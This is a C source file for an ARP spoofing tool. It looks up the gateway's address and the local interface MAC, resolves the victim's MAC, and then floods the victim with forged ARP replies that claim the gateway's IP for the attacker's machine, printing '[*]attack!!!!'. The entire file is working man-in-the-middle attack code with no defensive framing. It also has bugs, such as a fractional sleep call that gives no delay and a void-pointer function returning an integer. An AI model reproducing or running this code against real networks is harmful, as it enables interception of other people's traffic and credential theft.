#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include "arp.h"
#include "packet.h"

extern int GetMacflag;
extern int GetGateMacflag;
extern arphdr_t arp_attack_packet;
extern struct sniff_ethernet et_gate_packet;
extern struct sniff_ethernet et_attack_packet;

void GetGateway(char* line, char* gate_line)
{
    char cmd [1000] = {0,};
    sprintf(cmd,"/sbin/ip route | awk '/default/ {print $3}'");
    FILE* fp = popen(cmd, "r");
    fscanf(fp,"%s",line);
    pclose(fp);

    char cmd2 [1000] = {0,};
    sprintf(cmd2,"arp -n | grep \"%s\"| awk '{print $3}'",line);
    fp = popen(cmd2, "r");
    fscanf(fp,"%s", gate_line);
    pclose(fp);
}

//arp main
void* arp_spoof_main(void* arg)
{
	struct pthreadargv *pargv = (struct pthreadargv *)arg;
	pcap_t *handle = pargv->handle;
	char *target_ip = pargv->ip;

	//two packet
	u_char packet[1500] = {0,};

	int packet_len = 0;
	char buf[8192] = {0};
	struct ifconf ifc = {0,};
	struct ifreq *ifr = NULL;
	int sck = 0;
	int nInterfaces = 0;
	int i = 0, j = 0;
	char ip[INET6_ADDRSTRLEN] = {0};
	char macp[19];
	struct ifreq *item;
	struct sockaddr *addr;
	struct sniff_ethernet eth;
	arphdr_t arp_attack_packet;

	//[*]stage1 Get gateway IP address
	char gateway[GATEWAY_LEN] = {0,};
	char gate_mac[100] = {0,};
	GetGateway(gateway, gate_mac);
	printf("gateway address: %s", gate_mac);
	sscanf(gate_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
		&et_gate_packet.ether_dhost[0],
		&et_gate_packet.ether_dhost[1],
		&et_gate_packet.ether_dhost[2],
		&et_gate_packet.ether_dhost[3],
		&et_gate_packet.ether_dhost[4],
		&et_gate_packet.ether_dhost[5]);

	//[*]stage2 Get my mac address and target mac address
	printf("target address: %s \n", target_ip);

	/* Get a socket handle. */
	sck = socket(PF_INET, SOCK_DGRAM, 0);
	if(sck < 0)
	{
	  perror("socket");
	  return 1;
	}

	/* Query available interfaces. */
	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if(ioctl(sck, SIOCGIFCONF, &ifc) < 0)
	{
	  perror("ioctl(SIOCGIFCONF)");
	  return 1;
	}

	/* Iterate through the list of interfaces. */
	ifr = ifc.ifc_req;
	nInterfaces = ifc.ifc_len / sizeof(struct ifreq);

	for(i = 0; i < nInterfaces; i++)
	{
		item = &ifr[i];
		addr = &(item->ifr_addr);

		/* Get the IP address*/
		if(ioctl(sck, SIOCGIFADDR, item) < 0)
		{
		  perror("ioctl(OSIOCGIFADDR)");
		}

		if (inet_ntop(AF_INET, &(((struct sockaddr_in *)addr)->sin_addr), ip, sizeof ip) == NULL) //vracia adresu interf
		{
		   perror("inet_ntop");
		   continue;
		}

		if(!strcmp(ip,"127.0.0.1"))
			continue;
		/* Get the MAC address */
		if(ioctl(sck, SIOCGIFHWADDR, item) < 0) {
		  perror("ioctl(SIOCGIFHWADDR)");
		  return 1;
		}

		/* display result */
		sprintf(macp, " %02x:%02x:%02x:%02x:%02x:%02x",
		(unsigned char)item->ifr_hwaddr.sa_data[0],
		(unsigned char)item->ifr_hwaddr.sa_data[1],
		(unsigned char)item->ifr_hwaddr.sa_data[2],
		(unsigned char)item->ifr_hwaddr.sa_data[3],
		(unsigned char)item->ifr_hwaddr.sa_data[4],
		(unsigned char)item->ifr_hwaddr.sa_data[5]);

	    for (j = 0; j < 6; ++j) {
	    	eth.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
	    	et_attack_packet.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
	    	et_gate_packet.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
	    }
		for (j = 0; j < 6; ++j) {
			eth.ether_dhost[j] = '\xff';
		}
		printf("[*]ip: %s , mac: %s\n", ip, macp);
		GetGateMacflag = 1;
	}

	eth.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &eth, sizeof(eth));
	packet_len += sizeof(struct sniff_ethernet);

	arphdr_t arp_packet;
	arp_packet.htype = htons(1);
	arp_packet.ptype = htons(0x800);
	arp_packet.hlen = 6;
	arp_packet.plen = 4;
	arp_packet.oper = htons(1);

	for (i = 0; i < 6; ++i) {
		arp_packet.sha[i] = eth.ether_shost[i];
		arp_packet.tha[i] = '\x00';
	}

	inet_pton(AF_INET, ip, (struct in_addr *)arp_packet.spa);
	inet_pton(AF_INET, target_ip, (struct in_addr *)arp_packet.tpa);

	memcpy(packet+packet_len, &arp_packet, sizeof(arp_packet));
	packet_len += sizeof(arphdr_t);

	//send_arp_packet(handle, packet);
	if(pcap_sendpacket(handle, packet, packet_len) != 0)
	{
		fprintf(stderr,"Error sending arp packet\n");
	}

	//busy waiting.. while get victim's mac address
	while(1)
	{
		if(GetMacflag == 1)
			break;
	}

	//victime arp spoof attack
	memset(packet, 0, packet_len);
	packet_len = 0;

	et_attack_packet.ether_type = htons(ETHERTYPE_ARP);
	memcpy(packet, &et_attack_packet, sizeof(et_attack_packet));
	packet_len += sizeof(struct sniff_ethernet);

	arp_attack_packet.htype = htons(1);
	arp_attack_packet.ptype = htons(0x800);
	arp_attack_packet.hlen = 6;
	arp_attack_packet.plen = 4;
	arp_attack_packet.oper = htons(2);

	for (i = 0; i < 6; ++i) {
		arp_attack_packet.sha[i] = et_attack_packet.ether_shost[i];
		arp_attack_packet.tha[i] = et_attack_packet.ether_dhost[i];
	}

	printf("gateway: %s\n",gateway);
	inet_pton(AF_INET, gateway, (struct in_addr *)arp_attack_packet.spa);
	inet_pton(AF_INET, target_ip, (struct in_addr *)arp_attack_packet.tpa);

	memcpy(packet+packet_len, &arp_attack_packet, sizeof(arp_attack_packet));
	packet_len += sizeof(arphdr_t);

	printf("[*]attack!!!!\n");
	while(1)
	{
		sleep(0.5);
		if(pcap_sendpacket(handle, packet, packet_len) != 0)
		{
			fprintf(stderr,"Error sending arp packet\n");
		}
	}
	return NULL;
}
